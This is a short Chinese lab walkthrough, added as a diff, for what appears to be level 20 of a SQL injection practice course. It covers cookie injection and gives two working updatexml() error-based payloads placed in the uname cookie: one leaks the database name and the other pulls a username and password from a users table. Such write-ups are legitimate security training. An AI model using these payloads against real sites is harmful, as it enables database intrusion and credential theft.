@@ -1,0 +1,17 @@
+第20关
+
+cookie注入
+
+抓到第二个包找到cookie字段
+
+通过修改cookie使用updatexml()报错注入
+
+爆数据库
+Cookie: uname=admin'and updatexml(1,concat(0x7e,database(),0x7e),1) #
+
+爆信息
+Cookie: uname=admin'and updatexml(1,concat(0x7e,(select concat(username,0x3a,password) from users limit 1,1),0x7e),1) #
+
+
+
+闯关成功！！！
